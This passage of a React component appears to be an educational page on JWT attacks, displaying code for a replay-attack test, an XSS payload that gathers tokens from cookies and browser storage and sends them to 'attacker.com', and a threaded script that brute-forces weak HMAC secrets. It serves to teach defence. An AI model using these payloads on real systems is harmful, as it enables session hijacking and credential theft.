{`// Python script to test JWT replay attacks
import requests
import time

def test_replay_attack(base_url, valid_token):
    # Store original token
    original_token = valid_token
    
    # Test 1: Immediate replay
    response1 = make_authenticated_request(base_url, valid_token)
    print(f"First request: {response1.status_code}")
    
    # Test 2: Replay after short delay
    time.sleep(2)
    response2 = make_authenticated_request(base_url, valid_token)
    print(f"Replay request: {response2.status_code}")
    
    # Test 3: Replay after logout
    logout_response = requests.post(f"{base_url}/logout", 
                                  headers={"Authorization": f"Bearer {valid_token}"})
    response3 = make_authenticated_request(base_url, valid_token)
    print(f"Post-logout replay: {response3.status_code}")
    
    return response1.status_code == response2.status_code == response3.status_code

def make_authenticated_request(url, token):
    headers = {"Authorization": f"Bearer {token}"}
    return requests.get(f"{url}/api/protected", headers=headers)`}
                            </pre>
                        </div>
                    </div>

                    {/* Token Sidejacking Example */}
                    <div className="example-item mb-4 p-3 bg-light rounded">
                        <h6 className="text-dark mb-2">Token Sidejacking Simulation</h6>
                        <div className="code-example small bg-dark text-light p-3 rounded font-monospace">
                            <pre className="mb-0">
{`// JavaScript payload for token theft via XSS
(function() {
    // Method 1: Direct cookie theft
    var cookies = document.cookie;
    var stolenToken = cookies.match(/auth_token=([^;]+)/);
    
    // Method 2: Local storage extraction
    var localStorageToken = localStorage.getItem('jwt_token');
    
    // Method 3: Session storage extraction  
    var sessionStorageToken = sessionStorage.getItem('auth_token');
    
    // Exfiltrate stolen tokens
    var exfilUrl = 'https://attacker.com/steal?';
    if (stolenToken) exfilUrl += 'cookie=' + encodeURIComponent(stolenToken[1]);
    if (localStorageToken) exfilUrl += '&local=' + encodeURIComponent(localStorageToken);
    if (sessionStorageToken) exfilUrl += '&session=' + encodeURIComponent(sessionStorageToken);
    
    // Send stolen data
    var img = new Image();
    img.src = exfilUrl;
})();`}
                            </pre>
                        </div>
                    </div>

                    {/* Weak Secret Brute Force Example */}
                    <div className="example-item p-3 bg-light rounded">
                        <h6 className="text-dark mb-2">HMAC Secret Brute Force Attack</h6>
                        <div className="code-example small bg-dark text-light p-3 rounded font-monospace">
                            <pre className="mb-0">
{`# Python script for JWT secret brute forcing
import jwt
import requests
from concurrent.futures import ThreadPoolExecutor

def brute_force_jwt_secret(token, wordlist_file, target_url):
    with open(wordlist_file, 'r') as f:
        secrets = [line.strip() for line in f if line.strip()]
    
    def test_secret(secret):
        try:
            # Try to decode with current secret
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            
            # Verify by making authenticated request
            headers = {'Authorization': f'Bearer {token}'}
            response = requests.get(f"{target_url}/api/verify", headers=headers)
            
            if response.status_code == 200:
                print(f"[SUCCESS] Found secret: {secret}")
                return secret
        except jwt.InvalidSignatureError:
            pass
        except Exception as e:
            print(f"Error testing secret {secret}: {e}")
        
        return None
    
    # Use threading for faster brute forcing
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(test_secret, secrets)
        
        for result in results:
            if result:
                return result
    
    return None

# Common weak secrets to test first
common_secrets = [
    "secret", "password", "key", "token", "jwt",
    "123456", "admin", "changeme", "default", "test"
]`}
                            </pre>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};
